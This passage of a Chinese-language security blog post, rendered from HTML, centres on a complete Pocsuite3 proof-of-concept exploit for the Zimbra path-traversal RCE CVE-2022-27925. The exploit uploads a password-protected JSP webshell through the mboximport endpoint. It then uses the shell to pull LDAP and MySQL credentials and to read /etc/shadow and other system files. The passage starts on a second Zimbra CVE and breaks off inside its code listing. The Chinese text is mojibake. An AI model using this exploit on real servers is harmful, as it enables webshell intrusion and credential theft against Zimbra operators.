class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbraè·¯å¾„ç©¿è¶Šå¯¼è‡´çš„RCEæ¼æ´&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;ç›®å½•ç©¿è¶Š&#x27;</span></span><br><span class="line">    <span class="comment"># ä¸¥é‡ é«˜å± ä¸­å± ä½å±</span></span><br><span class="line">    level = <span class="string">&#x27;ä¸¥é‡&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2022-27925&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;v8.8.15 P30-v9.0.0 P23&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title:&quot;Zimbra ç®¡ç†&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra æ˜¯ä¸€å®¶æä¾›ä¸“ä¸šçš„ç”µå­é‚®ä»¶è½¯ä»¶å¼€å‘ä¾›åº”å•†ï¼Œä¸»è¦æä¾›ZimbraDesktopé‚®ä»¶ç®¡ç†è½¯ä»¶ã€‚å¦å¤–æä¾›ä¸€å¥—å¼€æºååŒåŠå…¬å¥—ä»¶åŒ…æ‹¬WebMailï¼Œæ—¥å†ï¼Œé€šä¿¡å½•ï¼ŒWebæ–‡æ¡£ç®¡ç†å’Œåˆ›ä½œã€‚</span></span><br><span class="line"><span class="string">    Zimbraçš„æœ€å¤§ç‰¹è‰²åœ¨äºå…¶é‡‡ç”¨AjaxæŠ€æœ¯æ¨¡ä»¿CSæ¡Œé¢åº”ç”¨è½¯ä»¶çš„é£æ ¼å¼€å‘çš„å®¢æˆ·ç«¯å…¼å®¹Firefoxï¼ŒSafariå’ŒIEæµè§ˆå™¨ã€‚</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    æœ€åˆï¼ŒZimbraå°†CVE-2022-27925ç§°ä¸ºç»è¿‡èº«ä»½éªŒè¯çš„è·¯å¾„éå†æ”»å‡»ï¼Œå…¶ä¸­ç®¡ç†ç”¨æˆ·å¯ä»¥å°†æ–‡ä»¶å†™å…¥æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•ç›®å½•ã€‚å› ä¸ºå®ƒæœ€åˆè¢«è®¤ä¸ºæ˜¯ä»…é™ç®¡ç†å‘˜çš„æ”»å‡»ï¼ŒNVDç»™å®ƒçš„CVSSåŸºæœ¬è¯„åˆ†ä¸º7.8ã€‚</span></span><br><span class="line"><span class="string">    åæ¥ï¼ŒVolexityæ³¨æ„åˆ°åˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…æ‰¾åˆ°äº†ç»•è¿‡ç®¡ç†è¦æ±‚çš„æ–¹æ³•ï¼Œå¹¶äº2022å¹´8æœˆ10æ—¥å¯¹æ­¤è¿›è¡Œäº†æŠ¥é“ã€‚è¿™ä¸ªæ–°çš„èº«ä»½éªŒè¯æ—è·¯è·å¾—äº†ä¸€ä¸ªæ–°çš„æ ‡è¯†ç¬¦- CVE-2022-37042ã€‚</span></span><br><span class="line"><span class="string">    é€šè¿‡ç»“åˆåŸå§‹è·¯å¾„éå†æ¼æ´å’Œæ–°çš„èº«ä»½éªŒè¯ç»•è¿‡ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç®¡ç†å‘˜ç«¯å£ï¼ˆé»˜è®¤ä¸º7071ï¼‰åŒ¿åè¿œç¨‹å±å®³Zimbra Collaboration Suiteç³»ç»Ÿã€‚</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra å®˜æ–¹ä¸‹è½½æœ€æ–°ç‰ˆæœ¬è¿›è¡Œä¿®å¤:https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_zip</span>(<span class="params">self, jsp, path</span>):</span><br><span class="line">        zip_buffer = io.BytesIO()</span><br><span class="line">        zf = zipfile.ZipFile(zip_buffer, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        zf.writestr(path, jsp)</span><br><span class="line">        zf.close()</span><br><span class="line">        <span class="keyword">return</span> zip_buffer.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        paths = [<span class="string">&#x27;../../../../mailboxd/webapps/zimbraAdmin/&#x27;</span>, <span class="string">&#x27;../../../../jetty_base/webapps/zimbraAdmin/&#x27;</span>, <span class="string">&#x27;../../../../jetty/webapps/zimbraAdmin/&#x27;</span>]</span><br><span class="line">        self.webshellName = random_str(<span class="number">10</span>) + <span class="string">&#x27;.jsp&#x27;</span></span><br><span class="line">        self.webshellPass = <span class="string">&quot;sMuw1P2&quot;</span></span><br><span class="line">        webshell_payload = <span class="string">r&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">                endpoints = [<span class="string">&quot;/service/extension/backup/mboximport?account-name=admin&amp;account-status=1&amp;ow=cmd&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/service/extension/backup/mboximport?account-name=admin&amp;ow=2&amp;no-switch=1&amp;append=1&quot;</span>]</span><br><span class="line">                zippedfile = self.build_zip(webshell_payload, i + self.webshellName)</span><br><span class="line">                headers = &#123;<span class="string">&#x27;content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">                <span class="keyword">for</span> endpoint <span class="keyword">in</span> endpoints:</span><br><span class="line">                    requests.post(self.url + endpoint, data=zippedfile, verify=<span class="literal">False</span>, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">                    ranStr2echo = random_str(<span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">if</span> ranStr2echo <span class="keyword">in</span> self.execute_command(<span class="string">&#x27;echo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ranStr2echo)):</span><br><span class="line">                        flag = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        data = &#123;self.webshellPass: command&#125;</span><br><span class="line">        req = requests.post(self.url + <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName), data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        r = requests.get(self.url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_email = re.<span class="built_in">compile</span>(<span class="string">&#x27;av_notify_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            av_notify_user = re.findall(pattern_email, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.upload_webshell():</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url</span><br><span class="line"></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user = self.get_ldap_and_mysql_Info()</span><br><span class="line">                <span class="comment"># Webç½‘ç«™ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># ç½‘ç«™é»˜è®¤é¦–é¡µçš„titleä¿¡æ¯ï¼ˆå¯èƒ½å«æœ‰å•ä½æˆ–ç»„ç»‡ä¿¡æ¯ï¼‰</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="comment">#webshellè·¯å¾„åŠå‚æ•°å</span></span><br><span class="line">                    <span class="string">&quot;webshell&quot;</span>: &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName),</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: self.webshellPass&#125;,</span><br><span class="line">                    <span class="string">&quot;admin notification emails&quot;</span>: av_notify_user</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># å‡­æ®ç±»ä¿¡æ¯ï¼Œé’ˆå¯¹å„ç±»å¼±å£ä»¤ã€é»˜è®¤å£ä»¤æ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass, <span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># è·å–çš„æ–‡ä»¶ä¿¡æ¯, é’ˆå¯¹å„ç±»æ–‡ä»¶è¯»å–ç±»æ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># å‘½ä»¤æ‰§è¡Œä¿¡æ¯, é’ˆå¯¹å„ç±»å‘½ä»¤æ‰§è¡Œã€ä»£ç æ‰§è¡Œæ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure><p>POCè¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642beed46ea21b9a9e5711fd.jpg" title="844315bf-c382-4478-9a91-a3f8bf5e4974" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beed46ea21b9a9e5711fd.jpg" alt="844315bf-c382-4478-9a91-a3f8bf5e4974"></a></p><h2 id="CVE-2022-41352-Zimbra-Unauthenticated-RCE"><a href="#CVE-2022-41352-Zimbra-Unauthenticated-RCE" class="headerlink" title="CVE-2022-41352 Zimbra Unauthenticated RCE"></a>CVE-2022-41352 Zimbra Unauthenticated RCE</h2><h3 id="æ¼æ´åŸç†-2"><a href="#æ¼æ´åŸç†-2" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>åœ¨Zimbra Collaborationï¼ˆZCSï¼‰8.8.15 å’Œ 9.0ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨cpioæ¼æ´é€šè¿‡amavisdä¸Šä¼ ä»»æ„æ–‡ä»¶åˆ°webç›®å½•&#x2F;opt&#x2F;zimbra&#x2F;jetty&#x2F;webapps&#x2F;zimbra&#x2F;publicï¼Œä»è€Œå¯¼è‡´æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ Zimbraå»ºè®®ç”¨æˆ·ä½¿ç”¨paxä»£æ›¿cpioï¼Œè™½ç„¶å®‰è£…paxæ˜¯Ubuntuä¸Šå®‰è£…Zimbraçš„å‰ææ¡ä»¶ï¼Œä½†æ˜¯åœ¨RHEL 6ï¼ˆæˆ–CentOS 6ï¼‰ä¹‹åï¼ŒRed Hatå‘è¡Œç‰ˆä¸å†é»˜è®¤å®‰è£…paxã€‚</p><h3 id="Pocsuite-POC-2"><a href="#Pocsuite-POC-2" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span 